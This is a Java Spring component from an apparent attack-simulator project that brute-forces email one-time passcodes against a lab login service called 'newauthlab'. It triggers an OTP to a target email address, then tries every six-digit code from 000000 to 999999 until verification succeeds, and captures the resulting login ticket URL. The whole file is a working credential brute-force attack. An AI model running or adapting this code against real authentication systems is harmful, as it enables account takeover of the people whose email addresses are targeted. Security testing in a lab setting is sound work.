package com.example.attacksimulator.attack;

import org.springframework.stereotype.Component;

import com.example.attacksimulator.client.NewAuthLabLoginClient;
import com.example.attacksimulator.client.NewAuthLabLoginClient.LoginResult;

@Component
public class EmailOtpBruteForceAttack {

	private final NewAuthLabLoginClient newAuthLabLoginClient;

	public EmailOtpBruteForceAttack(
			NewAuthLabLoginClient newAuthLabLoginClient) {

		this.newAuthLabLoginClient =
				newAuthLabLoginClient;
	}

	/**
	 * Email OTP 総当たり攻撃
	 *
	 * @param email 対象ユーザーのメールアドレス
	 * @param maxAttempts 最大攻撃試行回数
	 * @return 攻撃結果
	 */
	public AttackResult execute(
			String email,
			int maxAttempts) {

		if (email == null || email.isBlank()) {
			throw new IllegalArgumentException(
					"メールアドレスが指定されていません。");
		}

		if (maxAttempts <= 0) {
			throw new IllegalArgumentException(
					"最大試行回数は1以上にしてください。");
		}

		// OTPは000000～999999の6桁
		int actualMaxAttempts =
				Math.min(maxAttempts, 1_000_000);

		System.out.println("========================================");
		System.out.println("実際のEmail OTP総当たりを開始");
		System.out.println("email = " + email);
		System.out.println(
				"最大試行回数 = " + actualMaxAttempts);
		System.out.println("========================================");

		/*
		 * まず対象メールアドレスにOTPを発行する
		 */
		LoginResult sendOtpResult =
				newAuthLabLoginClient.sendEmailOtp(email);

		if (!sendOtpResult.isRequestSuccess()) {

			System.out.println("OTP発行に失敗しました。");
			System.out.println(
					"HTTP Status = "
							+ sendOtpResult.getStatusCode());

			return new AttackResult(
					false,
					null,
					0,
					null);
		}

		System.out.println(
				"newauthlabからOTPが発行されました。");

		int attemptCount = 0;

		/*
		 * 000000 ～ 999999 を総当たり
		 */
		for (int i = 0; i < 1_000_000; i++) {

			if (attemptCount >= actualMaxAttempts) {
				break;
			}

			String candidate =
					String.format("%06d", i);

			attemptCount++;

			System.out.println(
					"OTP Attempt "
							+ attemptCount
							+ " : candidate="
							+ candidate);

			/*
			 * OTP検証
			 *
			 * verifyEmailOtp() はリダイレクトを追跡せず、
			 * /attack-login?ticket=... を取得する
			 */
			LoginResult verifyResult =
					newAuthLabLoginClient
					.verifyEmailOtp(candidate);

			/*
			 * 認証成功
			 */
			if (verifyResult.isSuccess()) {

				System.out.println(
						"----------------------------------------");
				System.out.println("OTP found!");
				System.out.println(
						"OTP = " + candidate);
				System.out.println(
						"Attempts = " + attemptCount);
				System.out.println(
						"Final URL = "
								+ verifyResult.getFinalUrl());
				System.out.println(
						"----------------------------------------");

				return new AttackResult(
						true,
						candidate,
						attemptCount,
						verifyResult);
			}
		}

		/*
		 * 最大試行回数まで実行しても突破できなかった
		 */
		System.out.println(
				"----------------------------------------");
		System.out.println("OTP not found.");
		System.out.println(
				"Attempts = " + attemptCount);
		System.out.println(
				"----------------------------------------");

		return new AttackResult(
				false,
				null,
				attemptCount,
				null);
	}

	/**
	 * Email OTP総当たり攻撃結果
	 */
	public static class AttackResult {

		private final boolean success;
		private final String otp;
		private final int attemptCount;

		/*
		 * OTP認証成功時のログイン結果
		 *
		 * ここに
		 * /attack-login?ticket=...
		 * のURLを保持する
		 */
		private final LoginResult loginResult;

		public AttackResult(
				boolean success,
				String otp,
				int attemptCount,
				LoginResult loginResult) {

			this.success = success;
			this.otp = otp;
			this.attemptCount = attemptCount;
			this.loginResult = loginResult;
		}

		/**
		 * 旧形式との互換用
		 */
		public AttackResult(
				boolean success,
				String otp,
				int attemptCount) {

			this(
					success,
					otp,
					attemptCount,
					null);
		}

		public boolean isSuccess() {
			return success;
		}

		public String getOtp() {
			return otp;
		}

		public int getAttemptCount() {
			return attemptCount;
		}

		public LoginResult getLoginResult() {
			return loginResult;
		}
	}
}